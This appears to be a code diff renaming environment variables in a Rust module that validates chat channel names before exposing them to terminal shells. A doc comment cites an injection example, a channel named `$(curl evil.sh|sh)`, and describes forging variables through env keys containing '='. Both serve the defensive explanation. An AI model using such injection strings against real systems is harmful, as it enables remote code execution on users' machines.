@@ -4,7 +4,7 @@
 //! script in the substrate can act on it. That context crosses a trust
 //! boundary: a channel *name* is attacker-controlled — anyone who can create
 //! a channel picks the string — and it lands in an environment variable that
-//! shells interpolate into prompts. A `PS1` containing `$BUZZ_CHANNEL` turns a
+//! shells interpolate into prompts. A `PS1` containing `$NIMINO_CHANNEL` turns a
 //! channel named `$(curl evil.sh|sh)` into command execution the moment the
 //! user opens a terminal.
 //!
@@ -33,7 +33,7 @@ pub struct GuiContext {
     pub session_id: String,
 }
 
-/// Returns true if `name` is safe to expose as `BUZZ_CHANNEL`.
+/// Returns true if `name` is safe to expose as `NIMINO_CHANNEL`.
 ///
 /// Unicode letters, digits and marks are accepted so non-Latin channel names
 /// survive, plus space and `-`/`_`/`.`. Everything a shell gives meaning to —
@@ -47,7 +47,7 @@ fn is_safe_channel_name(name: &str) -> bool {
             .all(|c| c.is_alphanumeric() || matches!(c, ' ' | '-' | '_' | '.'))
 }
 
-/// The value to expose as `BUZZ_CHANNEL`: the name when it is safe, otherwise
+/// The value to expose as `NIMINO_CHANNEL`: the name when it is safe, otherwise
 /// the channel UUID.
 pub fn channel_display(context: &GuiContext) -> &str {
     if is_safe_channel_name(&context.channel_name) {
@@ -64,8 +64,8 @@ pub fn channel_display(context: &GuiContext) -> &str {
 /// (`src/managed_agents/env_vars.rs`), whose rationale applies verbatim here:
 /// `CommandBuilder::env` will pass a key containing `=` straight into the
 /// child's environ block, where `getenv("FOO")` matches whatever follows the
-/// first `=`. A key `BUZZ_CHANNEL=x` with value `y` lands as
-/// `BUZZ_CHANNEL=x=y`, so `getenv("BUZZ_CHANNEL")` returns `"x=y"` — a way to
+/// first `=`. A key `NIMINO_CHANNEL=x` with value `y` lands as
+/// `NIMINO_CHANNEL=x=y`, so `getenv("NIMINO_CHANNEL")` returns `"x=y"` — a way to
 /// forge a variable the fence otherwise controls.
 ///
 /// Every key we inject is a compile-time literal today, so this cannot fire
@@ -82,22 +82,22 @@ pub fn is_well_formed_env_key(key: &str) -> bool {
 
 /// The context variables to inject, in order.
 ///
-/// `BUZZ_CHANNEL` carries the validated display value; `BUZZ_CHANNEL_ID` is
+/// `NIMINO_CHANNEL` carries the validated display value; `NIMINO_CHANNEL_ID` is
 /// always the UUID, so a script that needs an unambiguous identifier has one
 /// that no channel name can spoof.
 pub fn context_vars(context: &GuiContext) -> Vec<(&'static str, String)> {
     let mut vars = vec![
-        ("BUZZ_CHANNEL_ID", context.channel_id.clone()),
-        ("BUZZ_CHANNEL", channel_display(context).to_owned()),
-        ("BUZZ_NPUB", context.npub.clone()),
-        ("BUZZ_RELAY_URL", context.relay_url.clone()),
-        ("BUZZ_TERM_SESSION", context.session_id.clone()),
-        ("BUZZ_TERM_VERSION", env!("CARGO_PKG_VERSION").to_owned()),
+        ("NIMINO_CHANNEL_ID", context.channel_id.clone()),
+        ("NIMINO_CHANNEL", channel_display(context).to_owned()),
+        ("NIMINO_NPUB", context.npub.clone()),
+        ("NIMINO_RELAY_URL", context.relay_url.clone()),
+        ("NIMINO_TERM_SESSION", context.session_id.clone()),
+        ("NIMINO_TERM_VERSION", env!("CARGO_PKG_VERSION").to_owned()),
     ];
     // Absent rather than empty when the user is not in a thread: `-n
-    // "$BUZZ_THREAD_ID"` and `${BUZZ_THREAD_ID+set}` should agree.
+    // "$NIMINO_THREAD_ID"` and `${NIMINO_THREAD_ID+set}` should agree.
     if let Some(thread_id) = &context.thread_id {
-        vars.push(("BUZZ_THREAD_ID", thread_id.clone()));
+        vars.push(("NIMINO_THREAD_ID", thread_id.clone()));
     }
     vars
 }
